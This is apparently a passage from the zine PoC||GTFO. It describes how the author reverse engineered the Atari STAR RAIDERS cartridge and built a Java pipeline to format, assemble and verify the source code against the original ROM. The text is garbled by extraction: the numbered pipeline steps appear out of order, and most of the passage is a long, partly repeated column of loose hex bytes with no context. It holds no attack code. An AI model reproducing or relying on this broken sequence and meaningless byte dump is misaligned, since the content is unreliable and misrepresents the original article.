in the message “SHIP DESTROYED BY ZYLON FIRE.”
But I was not only after uniform documenta-
tion, I also wanted to unify the symbol names of
the source code. For example, I had created a
hodge-podge of color-related symbol names, which
contained fragments such as “COL,” “CLR,” “COLR,”
and “COLOR.” To make matters worse, color-related
symbol names containing “COL” could be confused
with symbol names related to (pixel) columns. The
same occurred with symbol names related to Players
(sprites), which contained fragments such as “PL,”
“PLY,” “PLYR,” “PLAY,” and “PLAYER,” or with sym-
bol names of lookup tables, which ended in “TB,”
“TBL,” “TAB,” and “TABLE,” and so on. In addition
to inventing uniform symbol names I also did not
want to exceed a self-imposed symbol name limit of
15 characters. So I refactored the source code with
the search-and-replace functionality of the text edi-
tor over and over again.
18documentation by wrapping multi-line text at
a preset right margin, out- and indenting list
items, numbering lists, and vertically aligning
parameter descriptions. It also corrects the
number of trailing asterisks in line comments,
and adjusts the number of asterisks of the box
headers that introduce subroutine comments,
centering their text content inside the asterisk
boxes.
2. The output of the pre-formatter from step 1 is
fed into an Atari 6502 assembler, which I also
wrote in Java. It is available as open-source
on GitHub. 9 Why write an Atari 6502 assem-
bler? There are other 6502 assemblers readily
available, but not all produce object code for
the Atari 8-bit Home Computer System, not
all use the MAC/65 source code format, and
not all of them can be easily tweaked when
necessary. The output of this step is both an
assembler output listing and an object file.
I noticed that I spent more and more time
on refactoring the documentation and the symbol
names and less time on adding actual content. In
addition, the actual formatting of the emerging doc-
umented source code had to be re-adjusted after ev-
ery refactoring step. Handling the source code be-
came very unwieldy. And worst of all: How could
I be sure that the source code still represented the
exact binary image of the ROM cartridge?
The solution I found to this problem eventually
was to create an automated build pipeline, which
dealt with the monotonous chores of formatting and
assembling the source code, as well as comparing the
produced ROM cartridge image with a reference im-
age. This freed time for me to concentrate on the
actual source code content. Yet another incarnation
of “separation of form and content,” the automated
build pipeline was always a pleasure to watch work-
ing its magic. (Mental note: I should have created
this pipeline much earlier in the reverse engineering
effort.) These are the steps of the automated build
pipeline:
3. The assembler output listing from step 2 is the
finished, formatted, reverse engineered STAR
RAIDERS source code, containing the docu-
mentation, the source code, and the object
code listing.
4. The assembler output listing from step 2 is fed
into a symbol checker program, which I again
wrote in Java. It searches the documenta-
tion parts of the assembler output listing and
checks if every symbol, such as “GAMELOOP,” is
followed by its correct hex value, “($A1F3).” It
reports any symbol with missing or incorrect
hex values. This ensures further consistency
of the documentation.
1. The pipeline starts with a raw, documented as-
sembly language source code file. It is already
roughly formatted and uses a little propri-
etary markup, just enough to mark up sections
of meta-comments that are to be removed in
the output as well as subroutine documen-
tation containing multiple paragraphs, num-
bered, and unnumbered lists. This source code
file is fed to a pre-formatter program, which
I implemented in Java. The pre-formatter re-
moves the meta-comments. It also formats the
entries of the memory map and the subroutine
5. The object file of step 2 is converted by yet an-
other program I wrote in Java from the Atari
executable format into the final Atari ROM
cartridge format.
6. The output from step 5 is compared with a
reference binary image of the original STAR
RAIDERS 8 KB ROM cartridge. If both im-
ages are the same, then the entire build was
successful: The raw assembly language source
code really represents the exact image of the
STAR RAIDERS 8 KB ROM cartridge
9 git clone https://github.com/lwiest/Atari6502Assembler
unzip pocorgtfo13.pdf Atari6502Assembler.zip
192.8
Typical build times on my not-so-recent Win-
dows XP box (512 MB) were 15 seconds.
For some finishing touches, I ran a spell-checker
over the documented assembly language source code
file from time to time, which also helped to improve
documentation quality.
Conclusion
After quite some time, I achieved my goal to create a
reverse engineered, complete, and fully documented
assembly language source code of STAR RAIDERS .
For final verification, I successfully assembled it with
MAC/65 on an Atari 800 XL with 64 KB RAM (em-
ulated with Atari800Win Plus). MAC/65 is able to
assemble source code larger than the available RAM
by reading the source code as several chained files.
So I split the source code (560 KB) into chunks of 32
KB and simply had the emulator point to a hard disk
folder containing these files. The resulting assembler
output listing and the object file were written back
to the same hard disk folder. The object file, after
being transformed into the Atari cartridge format,
exactly reproduced the original STAR RAIDERS 8 KB
ROM cartridge.
2.9
Postscript
I finished my reverse engineering effort in Septem-
ber 2015. I was absolutely thrilled to learn that in
October 2015 scans of the original STAR RAIDERS
source code re-surfaced. To my delight, inspection
of the original source code confirmed the findings of
my reverse engineered version and caused only a few
trivial corrections. Even more, the documentation
of my reverse engineered version added a substan-
tial amount of information – from overall theory of
operation down to some tricky details – to the un-
derstanding of the often sparsely commented origi-
nal (quite expected for source code never meant for
publication).
20Cut Here if Printing on A4 Cut Here if Printing on A4
1
2
Самиздат
00
08
38
18
18
98
00
07
9d
00
f1
c0
00
91
0c
10
a4
0c
9d
0c
19
98
09
40
ad
35
fd
79
a5
db
a9
99
20
4c
d0
0d
a4
a2
02
f6
a5
ca
ca
a5
d0
e6
0a
10
1c
f0
38
0a
8f
ad
b2
ed
bb
9d
40
06
90
8a
d0
d2
d0
ad
95
32
e0
a7
50
e9
0b
0a
a9
20
0a
e6
85
81
69
03
bd
69
21
c9
1d
f3
d9
60
7f
08
00
00
18
80
61
07
00
02
ad
8d
85
68
99
f9
e7
ad
00
8d
85
aa
ca
0a
09
0b
71
bd
a9
be
0f
ee
64
9b
d0
49
0a
40
b0
ad
66
10
68
b9
d0
a2
d0
f7
a5
61
ad
d2
85
0a
60
85
9d
ad
0a
85
02
4a
1b
c9
42
09
a8
a4
06
ad
c9
30
ca
9d
40
b0
05
a9
ed
8d
a9
b0
73
0b
bf
06
92
b5
75
f0
47
78
00
18
18
b6
66
07
d4
a9
a9
0e
7a
ca
00
ad
ae
f0
05
01
6d
a4
10
b9
49
85
0a
40
00
9d
85
00
b7
a6
03
01
c8
86
06
0a
30
f8
40
00
60
60
08
18
a1
a5
2d
09
8d
d2
a2
75
a2
09
4a
6b
a9
a8
a4
04
a5
ad
d6
a7
90
8e
20
9d
e0
a2
8d
03
71
50
60
9b
00
18
bf
a9
8d
b0
09
82
bf
3f
47
00
38
7e
18
80
74
80
e0
a6
20
d4
a5
e0
07
90
fc
0c
e8
d0
a4
6e
db
ad
ff
6a
85
0a
95
2a
6a
4c
49
20
20
dd
c0
e3
a9
d2
09
ad
99
08
ae
c0
c9
a5
c9
70
0c
10
a5
25
01
8d
0a
a9
85
84
00
b9
62
b0
e9
0a
aa
c0
d2
0c
b0
2a
10
0a
8c
ee
f0
8d
ad
0b
a8
60
9d
00
04
47
9d
29
b0
a9
47
78
38
db
fc
8c
00
46
0f
8d
85
a5
c0
04
c8
0c
0b
85
c8
ad
79
20
a6
09
9d
a9
6b
bc
e4
0c
1d
e7
ff
fe
bf
ad
02
a2
00
24
e6
08
a4
85
5c
0a
05
68
4b
c9
e9
25
8e
c7
20
5c
20
63
69
6a
20
c8
b9
1e
05
d2
10
31
a6
d0
de
0c
d0
b9
0c
d5
10
90
b1
a9
85
b5
74
9d
d2
aa
92
07
c2
00
47
48
38
99
8c
80
76
1f
b0
23
71
67
30
d0
ca
c9
8e
6a
c6
2c
84
9b
79
65
40
00
4c
ad
9d
ad
8c
a4
c9
af
a7
09
b0
ff
a8
8a
66
d0
00
68
09
90
90
69
90
fe
7d
c6
85
99
6f
09
be
9d
bd
e6
ca
00
85
a9
ea
25
24
b0
a7
0b
8c
ad
c5
04
a9
0a
a5
0c
09
01
68
ec
0a
9a
60
bd
09
f0
d9
85
47
40
80
db
8c
ff
69
0d
03
02
a9
f0
2d
d7
10
01
5e
8d
6a
0c
6e
b6
e0
6b
0a
fd
a4
09
ee
fb
0c
a0
10
ad
ae
f0
40
86
4c
50
10
0d
e8
b9
a4
f9
0a
28
21
b0
18
8d
8c
42
b8
4c
b7
f9
d3
6d
ae
a4
bf
60
29
c7
a9
13
a4
a5
68
0a
60
0b
ff
ad
75
a9
d0
8d
85
c9
a9
0b
a0
92
84
ed
7d
86
7f
40
80
7e
80
80
65
46
9d
a9
80
fc
a6
a5
f9
a4
0c
bf
10
8d
18
88
10
99
8a
a2
a4
d0
0c
0b
4a
af
90
00
5c
06
20
8a
5e
07
05
09
88
64
a2
b5
a9
85
c9
5c
65
cb
4a
0a
a0
23
8a
0b
0a
06
8d
d0
ae
8d
01
9d
78
b9
a7
eb
0b
d2
b9
9d
a6
2c
c9
01
fa
cc
a3
e8
ff
9d
80
09
65
4a
bf
a6
00
7e
80
18
80
8e
77
71
00
a7
8d
a9
79
66
ac
e8
ad
0c
f4
02
98
10
d0
ad
18
0a
bd
02
24
18
a8
a6
02
d3
09
aa
e1
a9
a1
30
a0
d0
10
08
c0
e9
04
68
4f
c9
c4
0b
29
98
17
b2
a8
9d
6a
6a
cb
f0
a4
8e
a4
a2
95
b8
b5
d0
a9
29
ad
04
90
0c
02
8d
a2
0b
85
b0
95
cb
b0
0a
2c
c9
90
90
30
42
80
66
80
80
00
09
d2
8d
02
00
86
10
5d
ae
f1
b9
a4
d0
aa
eb
02
09
69
85
04
49
d0
69
b9
81
a9
a8
a5
bd
ae
00
e6
04
00
0d
0e
85
05
f0
10
90
b0
80
29
60
07
18
a9
c6
a9
2a
85
26
0b
05
0a
0c
90
0a
aa
00
b2
06
00
0f
09
0b
bc
38
90
b1
0c
85
7a
f9
ec
0b
04
30
95
03
bd
de
10
7e
80
66
84
b8
00
06
9d
01
d4
85
7a
0e
0c
fd
0c
e4
e4
ad
69
a6
a2
98
31
6b
0b
ff
10
04
2f
a5
0f
29
bf
cf
a0
85
62
29
4c
0a
20
69
b0
3c
06
02
1d
90
7f
98
aa
69
00
c2
05
0c
68
6b
8d
49
10
a2
d9
69
a5
4a
d5
a5
8d
79
9d
b9
c9
e9
05
09
20
75
91
ac
9d
a2
49
eb
09
d0
a4
c9
10
00
80
66
fc
80
00
06
00
02
a9
67
bd
a9
ae
0b
85
b8
ae
2d
31
79
04
18
aa
4c
85
a8
0b
9d
be
8b
0a
03
30
be
02
eb
a5
72
5c
d0
82
a5
24
bd
c9
e6
a9
03
85
30
bd
31
85
10
85
20
4c
90
cc
ff
02
02
c9
13
62
b9
ac
be
8e
f9
ad
35
08
78
a0
8d
a6
4c
68
5c
a5
02
ff
a5
50
01
6b
08
10
7c
80
66
00
9c
00
41
d3
a9
02
a5
f9
00
bf
8e
6a
b0
f9
0c
a8
e0
8a
69
c6
7d
6a
b9
e0
f9
95
f0
29
aa
05
85
20
a9
62
09
a1
0d
a7
a6
a5
71
fa
69
aa
20
8f
11
b3
a8
71
68
6e
c1
52
03
0b
18
29
20
08
9d
ac
40
f0
f0
0c
0b
09
0b
30
c9
1f
e2
b3
7b
c8
09
0a
20
a0
eb
07
4a
38
10
PoC
38
44
ff
66
00
80
00
80
9d
04
8d
7a
0b
8d
0c
5f
8d
03
0b
8d
20
05
a8
31
6a
a4
bd
e9
03
0b
e4
0c
1c
bd
aa
ca
6b
02
29
40
4c
0b
a9
4a
a0
0a
b0
ca
8d
b4
a5
a9
bf
c9
85
a9
18
ac
aa
a9
38
69
7f
64
b0
71
0a
0a
08
03
8d
4a
b9
9d
02
10
20
09
a0
b0
d0
84
a9
6f
00
c9
a9
a8
a9
13
38
04
00
2c
00
ff
00
02
67
8d
03
f0
9d
e3
99
0c
c0
2d
8e
03
9b
b0
a9
c9
10
bd
71
0d
90
ac
b9
c6
05
f5
09
20
ac
85
03
aa
4b
d0
05
4a
85
bc
02
10
9e
a9
62
ff
85
93
c0
01
a5
ca
38
ff
ad
01
8d
b7
ba
0a
d2
b0
b0
c6
2c
e9
40
35
a9
b0
23
8d
21
78
fb
89
00
b8
84
1e
00
b9
ff
a9
38
1c
3c
38
00
80
67
a9
00
02
d4
20
5b
17
00
ad
0c
0a
5b
d0
b6
05
00
90
e0
35
0a
20
eb
42
7f
8b
72
ba
80
e6
a2
be
85
a5
a7
85
85
85
a6
de
a9
e7
1c
a9
f0
85
c7
90
a9
85
68
e0
a9
60
2d
18
ca
a9
a9
09
c0
06
04
be
0c
10
0a
0b
00
22
b2
13
20
85
e6
a9
9d
a2
6a
a9
85
e9
f5
00
00
10
20
30
00
b0
61
00
e8
d3
a9
a2
0c
8d
06
f2
b9
d2
0c
ad
98
bd
85
90
88
0b
85
1e
ad
0a
be
a0
a8
85
85
ac
7f
a2
62
d0
48
83
a2
6a
b9
09
fa
ae
8d
03
11
c0
a4
e5
10
c1
69
11
00
c6
0c
75
0b
3c
ff
71
30
c9
f6
60
a9
9d
9d
60
85
ad
a9
0a
23
6a
69
0c
8f
00
c9
80
7e
00
ec
9d
78
10
20
00
00
98
6c
8d
d0
a9
3e
04
a8
e4
c8
0c
e4
9d
ad
2e
aa
8c
6b
ce
10
85
6b
b7
0a
a5
9d
4f
b9
c9
bf
20
a5
01
4c
c9
8a
ad
2c
a5
6e
f0
18
5c
a4
8d
ad
a2
92
ad
85
a9
50
b0
fd
6e
fd
b4
09
85
95
9d
90
0a
b2
18
3e
f9
40
a5
e9
fb
00
8d
b2
ad
a4
a4
0c
8a
08
bc
20
f0
85
c9
08
10
78
7c
00
be
61
0f
ea
11
8d
e8
b9
17
ca
85
b8
00
ee
0c
a4
0c
b9
ca
d7
6a
20
bd
d2
76
ee
29
90
98
b5
79
81
20
5a
03
48
0f
95
a6
bf
08
69
09
1c
5c
0a
00
84
42
79
30
85
02
d3
10
2a
10
80
eb
e9
40
01
90
90
bd
85
0b
0a
7b
85
0b
85
a6
a2
0b
69
a3
9d
d0
90
14
0d
e1
e2
08
08
00
60
44
ff
98
63
d2
ca
8d
00
bc
00
8d
10
6a
b0
06
0c
8d
6e
f0
66
10
a5
bd
21
71
a0
29
0c
20
ba
4a
e9
aa
d0
6f
a1
90
98
d0
09
29
0a
c9
4d
c8
bd
09
d2
20
90
0a
a9
85
68
a2
0a
df
0c
02
ae
a9
ad
0a
4a
0e
02
a2
eb
20
b9
f0
ea
38
75
0a
05
d4
c0
84
43
06
02
bf
ae
a5
c9
38
78
38
60
44
80
b0
74
85
9a
1b
d4
5b
08
bc
f9
8d
03
e8
85
07
20
19
0b
c4
d0
a2
aa
0a
f2
0f
98
f0
85
4a
d0
a5
1e
b8
20
02
48
85
70
03
85
0c
85
a5
40
a9
a4
a6
a9
09
00
79
9d
30
85
a4
20
a9
73
88
0a
20
4a
b0
d6
0a
a2
af
d3
fb
85
e9
60
8d
bd
c9
20
86
0a
a5
a9
90
a0
d0
0f
a5
40
28
7c
7c
80
80
69
66
d8
d0
a9
0c
85
17
ac
c1
2d
c8
6a
d0
9b
38
10
a0
c9
0a
20
bc
30
85
4a
04
6a
29
0b
7b
a2
a2
04
a2
a9
82
09
a8
6c
90
a1
88
0a
90
d0
b3
00
71
85
a9
d3
c6
68
6d
ca
00
0a
8d
d2
be
95
04
b2
69
02
ac
0a
a5
eb
68
24
9b
8b
7c
a8
f0
9d
e1
07
17
52
f0
90
cb
40
28
00
68
80
ff
63
85
a9
a9
00
b9
68
8d
5c
0c
0a
c6
8d
18
b6
bd
09
04
02
85
fb
de
2b
6b
4a
a2
bd
03
8a
d0
0a
0a
b8
a0
e0
68
a0
b9
90
0a
a9
f0
c9
8d
f0
20
85
8d
c1
03
0a
6e
a9
b9
ae
c9
10
68
29
b7
b8
c9
86
02
a4
ad
9d
d0
85
c9
75
0b
bb
90
90
02
07
c9
a8
e0
20
02
05
e9
78
7c
66
6c
80
00
00
62
02
03
8d
00
b9
bb
0c
b9
d2
6a
bd
69
88
d3
49
98
b0
6b
b6
09
d5
98
4a
42
2a
aa
49
5c
20
20
20
86
ac
a8
02
b0
0d
a9
00
04
0c
8f
06
a7
7b
42
85
85
a5
10
00
e9
8d
10
02
0b
07
bd
b5
f5
6a
c9
a7
0a
d3
d0
7b
10
70
a9
9d
f9
f2
a9
0b
18
a5
03
23
a9
b9
03
00
6c
99
6c
80
00
63
85
20
8d
07
08
64
17
ae
e4
9d
10
0c
02
10
0a
7f
aa
5c
20
ca
d0
e9
bc
a8
a0
0c
bd
01
a5
45
a8
9b
f6
0b
68
bd
ba
a9
0b
85
c6
b0
0c
8d
b1
be
0a
73
c2
69
c7
fd
0d
9a
90
29
a9
a8
40
a8
b0
aa
05
84
d2
0a
05
30
b0
0d
10
92
b9
60
00
9d
b0
6a
d0
b2
ff
8c
85
78
6c
99
00
80
6c
68
63
0f
1d
d4
85
08
a9
be
b8
00
ef
b9
8d
eb
e5
18
a9
a6
21
10
02
f0
f9
b9
60
29
f5
aa
eb
b0
ae
a8
a2
d4
aa
f9
25
81
10
a2
88
0e
85
2d
a0
c9
a2
85
a6
69
86
40
60
0b
02
7f
00
b9
0a
2c
04
bd
b0
bf
29
b9
a9
0a
18
30
8d
09
62
a5
85
12
18
19
05
a2
85
0c
cb
08
7c
99
1c
80
6f
61
a9
ae
d0
a9
68
85
00
0c
b0
07
a4
b1
06
a5
70
69
02
79
aa
a6
49
e0
0b
d1
84
03
ba
b5
f0
a0
a4
20
08
c0
68
ba
6b
85
06
a9
d0
a0
ec
0c
1b
08
02
8a
c3
00
c3
0a
a5
38
a9
8d
8d
89
c9
0a
b9
99
f5
4c
87
de
14
a0
ad
42
44
ca
ba
84
88
0a
a0
c9
2c
12
6c
c9
a5
08
00
66
3e
80
6e
72
03
a9
20
10
b9
69
ac
99
03
e8
e5
b9
d0
c9
9d
01
85
a9
20
20
ff
70
c0
bf
f4
a8
85
e9
58
23
63
16
b5
60
40
c9
a4
a4
c9
36
39
a0
a9
8d
4c
10
4c
8d
a9
85
60
4a
c0
ad
0f
99
2c
bf
20
d2
ad
bf
a0
af
9d
09
8d
02
42
a5
0a
10
c8
ac
84
9d
07
bf
96
20
59
80
cc
7c
7c
00
63
00
67
74
8d
51
ba
85
64
bd
5f
00
2d
c8
ae
9d
69
f0
d3
b0
6a
ff
1e
62
a8
f3
cc
c0
86
b9
c8
d0
ac
a2
ad
b2
ee
f0
48
fe
6a
a5
f5
85
a5
8c
1f
fc
8d
2e
be
8f
12
69
a9
85
05
2e
95
0b
0c
9d
b0
10
09
a6
d0
ac
66
9d
1b
20
0a
75
a9
f7
10
10
84
38
bd
60
09
a6
40
a9
e9
0c
44
00
5d
00
00
00
0f
8d
b3
79
08
2a
0c
05
0a
c6
fa
00
02
19
0a
02
bd
bc
b7
b1
b9
bc
b0
08
f6
b0
20
03
42
08
1f
20
9d
02
a9
d0
11
a1
b0
68
a0
40
8d
0b
a9
a9
b7
0c
85
9d
00
69
7b
0c
b4
a5
8d
8c
11
02
4a
6a
bd
a9
0b
de
d0
6b
c9
d0
00
a9
02
d0
2c
0b
20
24
70
b3
0a
00
00
0c
44
00
63
00
72
00
d2
16
a2
a6
85
0c
ae
c8
d2
6a
0b
04
8d
85
bd
c6
ad
ad
bd
24
e9
40
af
d0
a6
ba
3d
ae
0a
20
d0
e4
12
a9
00
e4
68
85
02
a9
c9
1d
43
c9
c6
ff
f0
85
69
40
85
66
d0
fd
c9
76
99
0c
bd
49
a9
99
ad
80
ad
09
a9
ac
02
f5
8d
89
a9
84
92
a9
bf
64
0e
60
c9
85
85
7c
7c
00
3e
00
61
00
a0
02
0a
62
69
4a
c1
ca
9d
10
8e
e8
05
6d
40
6b
09
09
de
d0
0d
0a
a4
03
79
25
af
5c
c8
0a
49
b4
d0
a0
8d
60
91
a5
a9
1b
81
8c
0a
10
91
85
0e
80
ad
0a
6d
68
f9
2a
08
29
0b
a5
ad
0f
0f
66
09
85
0a
b9
02
a2
b0
c6
75
a2
0d
84
09
01
99
30
e0
a2
10
88
cc
00
0c
00
1c
00
6e
60
2f
a9
20
bc
bc
4a
0c
10
00
ef
5c
c8
d0
a4
0a
18
c9
c4
09
50
20
24
d0
4d
bd
6a
20
09
c0
b1
ff
4c
ca
8d
0e
a9
68
a9
f5
85
90
68
38
b0
f0
7b
a9
c0
0a
a9
a9
06
a5
0c
90
03
8d
62
09
95
b0
0b
4a
73
d2
71
8d
0a
11
75
0a
03
9d
d0
70
9d
da
57
04
02
90
95
60
60
0c
7e
00
00
67
46
a9
a7
45
0c
8c
9d
99
f9
03
ad
0c
c6
69
79
e5
79
02
d0
d0
31
fb
7b
f0
0a
40
9d
29
8e
02
a2
29
f3
10
09
d2
55
24
aa
18
69
33
1d
ad
14
05
a0
ff
17
d2
00
07
6d
86
20
02
f0
ca
f0
f0
ac
02
98
bd
a2
29
0a
5c
4c
ad
a0
a9
9d
80
0e
e1
b0
00
a6
d0
ca
02
ec
18
60
0c
00
46
00
65
1a
ff
8d
b0
bf
0c
8c
00
ac
c8
8e
ad
6a
02
84
c1
d3
90
f0
12
a2
b6
50
02
d2
0a
ee
ae
5c
b0
5f
03
a1
f8
d4
a9
85
6e
20
69
a2
c9
8c
fc
ad
a2
00
85
f0
29
9d
85
38
f0
ca
49
2e
0b
03
08
e8
a9
18
40
30
87
9d
09
a8
af
1c
87
55
02
84
30
09
e8
62
05
10
a9
b0
a5
60
00
00
46
80
00
a1
84
17
a5
20
bd
0c
03
5b
e8
0c
ef
10
8d
6e
9d
0a
10
4b
38
31
ca
1e
49
a4
a4
0c
2c
09
50
a0
85
a9
8d
a2
40
6b
10
84
83
0e
85
42
0b
0a
02
a9
8b
04
03
66
6e
a5
30
ae
0f
a5
60
b9
b5
e8
00
69
0a
86
9d
71
a9
ae
09
4c
8d
09
e8
66
05
9d
88
ad
2c
01
0f
4b
cb
a
6c
00
00
44
80
73
f0
65
02
64
23
bd
a8
c8
0c
c6
c9
0c
f4
04
18
40
99
0a
bd
a9
20
10
e0
ff
6a
d0
ca
95
a5
ac
80
63
ff
1e
04
8d
a5
04
a7
85
a0
b0
1d
e9
d2
4c
00
a2
85
a8
0b
46
6a
a6
8d
0a
e6
a5
91
e4
e0
95
31
b0
79
97
0a
30
ad
2d
23
6a
ca
c6
a6
8a
d6
10
0a
95
60
4a
99
69
7c
00
00
7c
aa
63
47
85
a9
29
b2
0c
b1
ca
ae
6a
01
85
ad
d0
98
0a
d3
a9
0f
00
6f
db
02
c9
59
c0
e0
09
7c
73
a9
f0
85
d0
8d
0e
a4
e6
e6
a0
06
2f
8c
77
09
6f
99
06
e9
b9
9d
6b
e5
89
9b
95
f0
a7
bf
f0
06
ac
a8
08
ad
0b
b9
8d
42
11
b2
0b
10
6a
c0
49
0a
f6
d2
09
bd
84
e9
06
0c
00
00
64
9c
61
35
64
d1
80
a9
91
68
10
bd
10
a4
6a
2a
24
aa
bd
0a
00
0a
fd
a7
a2
b0
20
db
01
05
70
f0
0a
08
1a
67
20
0a
d2
85
a5
a6
bd
b1
a9
6a
18
10
b8
68
20
85
3a
97
66
68
38
0b
ba
04
49
95
08
90
18
e8
49
0a
ad
0f
8e
0a
0a
a2
a9
fa
d0
d0
01
a5
bd
dd
70
8f
6b
00
85
0c
00
18
66
be
6e
0d
a9
8d
a8
40
68
9d
f9
0c
ef
e6
8d
0c
d0
69
ad
b9
9d
d0
04
2c
05
16
b0
bf
d0
b0
40
13
c8
20
88
a9
ab
d4
ad
6e
d0
a5
a2
68
aa
1d
65
25
a0
0b
a6
ea
bb
0b
6a
a8
bd
a2
ca
a5
01
a8
c9
f1
98
e8
ff
d2
0a
0a
0c
d0
49
00
81
a9
f0
08
85
d0
20
10
05
0c
a8
b9
cb
00
00
18
66
9c
00
07
00
22
a2
8d
e4
bd
ac
99
ad
ae
be
8d
30
62
09
40
ad
12
0b
96
ca
ad
a5
45
09
ca
a5
a5
c0
f1
10
e0
b2
b5
09
29
02
6c
0a
29
8d
84
c5
c6
19
a9
b3
85
9d
9d
a5
a5
f9
03
10
eb
85
a9
29
a6
69
e0
a4
29
d2
9d
a9
0a
01
86
85
07
58
a6
87
4a
bf
bf
a9
d0
a5
8c
a5
78
00
18
fe
aa
00
07
aa
02
5f
0e
7a
0c
5e
00
8f
fb
0c
00
3a
a8
e9
0a
09
38
85
09
10
2c
c9
6b
c9
24
7e
d0
02
ad
17
8d
e6
f7
d2
7f
e6
d0
49
55
fe
a3
29
8d
20
01
a0
eb
71
c8
d0
6b
0b
d6
d2
d0
a7
01
f0
a7
31
06
62
0f
29
0f
20
ad
05
65
75
8d
60
87
8a
6a
8d
b0
c0
f7
6c
0c
cc
40
00
7e
92
80
00
07
9d
a9
a9
d2
90
1d
0c
04
0c
0b
b9
d0
a5
20
00
65
b0
a9
6a
70
03
0c
10
bc
f0
64
f0
c9
b0
20
85
09
77
9d
09
85
a6
e8
ff
91
1b
60
7f
9a
87
99
75
85
0a
0b
d0
e5
ed
ba
ad
25
aa
95
04
b5
a8
90
f0
79
87
0a
8d
d5
70
a4
8d
6a
a9
c9
9d
09
08
4d
bc
b5
5d
f0
69
40
38
18
10
ff
00
07
00
18
08
58
e6
ee
ae
c8
c9
8e
b1
ad
c8
9b
9d
6b
05
00
a9
27
4c
18
90
df
b0
50
3c
02
48
0d
66
d4
d0
16
c0
a4
c6
e6
bc
68
8d
a4
85
0b
a9
af
20
ec
b9
a9
0f
69
fc
10
8e
ad
b5
aa
a9
a8
e8
dc
e4
2a
9d
b9
8d
0a
0d
d1
cc
0b
10
01
e1
66
d2
29
1a
ec
43
43
00
78
38
18
18
80
00
07
d0
8d
20
a9
a9
0c
c0
ca
01
5d
b9
2b
f0
b6
ad
99
fe
fd
00
a6
79
7d
02
b8
03
03
a5
b0
ac
ae
c9
a6
0d
d0
85
a4
a4
a1
0f
88
04
c0
8e
ad
a5
09
23
85
3e
01
bd
90
0b
27
0c
0a
e9
9d
00
d0
e8
a6
a0
0c
c8
a2
0c
c9
a4
d0
0b
a9
85
f0
09
9d
bd
07
bf
f0
0a
c9
85
3
c
00
08
38
18
18
98
00
07
9d
00
f1
c0
00
91
0c
10
a4
0c
9d
0c
19
98
09
40
ad
35
fd
79
a5
db
a9
99
20
4c
d0
0d
a4
a2
02
f6
a5
ca
ca
a5
d0
e6
0a
10
1c
f0
38
0a
8f
ad
b2
ed
bb
9d
40
06
90
8a
d0
d2
d0
ad
95
32
e0
a7
50
e9
0b
0a
a9
20
0a
e6
85
81
69
03
bd
69
21
c9
1d
f3
d9
60
7f
08
00
00
18
80
61
07
00
02
ad
8d
85
68
99
f9
e7
ad
00
8d
85
aa
ca
0a
09
0b
71
bd
a9
be
0f
ee
64
9b
d0
49
0a
40
b0
ad
66
10
68
b9
d0
a2
d0
f7
a5
61
ad
d2
85
0a
60
85
9d
ad
0a
85
02
4a
1b
c9
42
09
a8
a4
06
ad
c9
30
ca
9d
40
b0
05
a9
ed
8d
a9
b0
73
0b
bf
06
92
b5
75
f0
47
78
00
18
18
b6
66
07
d4
a9
a9
0e
7a
ca
00
ad
ae
f0
05
01
6d
a4
10
b9
49
85
0a
40
00
9d
85
00
b7
a6
03
01
c8
86
06
0a
30
f8
40
00
60
60
08
18
a1
a5
2d
09
8d
d2
a2
75
a2
09
4a
6b
a9
a8
a4
04
a5
ad
d6
a7
90
8e
20
9d
e0
a2
8d
03
71
50
60
9b
00
18
bf
a9
8d
b0
09
82
bf
3f
47
00
38
7e
18
80
74
80
e0
a6
20
d4
a5
e0
07
90
fc
0c
e8
d0
a4
6e
db
ad
ff
6a
85
0a
95
2a
6a
4c
49
20
20
dd
c0
e3
a9
d2
09
ad
99
08
ae
c0
c9
a5
c9
70
0c
10
a5
25
01
8d
0a
a9
85
84
00
b9
62
b0
e9
0a
aa
c0
d2
0c
b0
2a
10
0a
8c
ee
f0
8d
ad
0b
a8
60
9d
00
04
47
9d
29
b0
a9
47
78
38
db
fc
8c
00
46
0f
8d
85
a5
c0
04
c8
0c
0b
85
c8
ad
79
20
a6
09
9d
a9
6b
bc
e4
0c
1d
e7
ff
fe
bf
ad
02
a2
00
24
e6
08
a4
85
5c
0a
05
68
4b
c9
e9
25
8e
c7
20
5c
20
63
69
6a
20
c8
b9
1e
05
d2
10
31
a6
d0
de
0c
d0
b9
0c
d5
10
90
b1
a9
85
b5
74
9d
d2
aa
92
07
c2
00
47
48
38
99
8c
80
76
1f
b0
23
71
67
30
d0
ca
c9
8e
6a
c6
2c
84
9b
79
65
40
00
4c
ad
9d
ad
8c
a4
c9
af
a7
09
b0
ff
a8
8a
66
d0
00
68
09
90
90
69
90
fe
7d
c6
85
99
6f
09
be
9d
bd
e6
ca
00
85
a9
ea
25
24
b0
a7
0b
8c
ad
c5
04
a9
0a
a5
0c
09
01
68
ec
0a
9a
60
bd
09
f0
d9
85
47
40
80
db
8c
ff
69
0d
03
02
a9
f0
2d
d7
10
01
5e
8d
6a
0c
6e
b6
e0
6b
0a
fd
a4
09
ee
fb
0c
a0
10
ad
ae
f0
40
86
4c
50
10
0d
e8
b9
a4
f9
0a
28
21
b0
18
8d
8c
42
b8
4c
b7
f9
d3
6d
ae
a4
bf
60
29
c7
a9
13
a4
a5
68
0a
60
0b
ff
ad
75
a9
d0
8d
85
c9
a9
0b
a0
92
84
ed
7d
86
7f
40
80
7e
80
80
65
46
9d
a9
80
fc
a6
a5
f9
a4
0c
bf
10
8d
18
88
10
99
8a
a2
a4
d0
0c
0b
4a
af
90
00
5c
06
20
8a
5e
07
05
09
88
64
a2
b5
a9
85
c9
5c
65
cb
4a
0a
a0
23
8a
0b
0a
06
8d
d0
ae
8d
01
9d
78
b9
a7
eb
0b
d2
b9
9d
a6
2c
c9
01
fa
cc
a3
e8
ff
9d
80
09
65
4a
bf
a6
00
7e
80
18
80
8e
77
71
00
a7
8d
a9
79
66
ac
e8
ad
0c
f4
02
98
10
d0
ad
18
0a
bd
02
24
18
a8
a6
02
d3
09
aa
e1
a9
a1
30
a0
d0
10
08
c0
e9
04
68
4f
c9
c4
0b
29
98
17
b2
a8
9d
6a
6a
cb
f0
a4
8e
a4
a2
95
b8
b5
d0
a9
29
ad
04
90
0c
02
8d
a2
0b
85
b0
95
cb
b0
0a
2c
c9
90
90
30
42
80
66
80
80
00
09
d2
8d
02
00
86
10
5d
ae
f1
b9
a4
d0
aa
eb
02
09
69
85
04
49
d0
69
b9
81
a9
a8
a5
bd
ae
00
e6
04
00
0d
0e
85
05
f0
10
90
b0
80
29
60
07
18
a9
c6
a9
2a
85
26
0b
05
0a
0c
90
0a
aa
00
b2
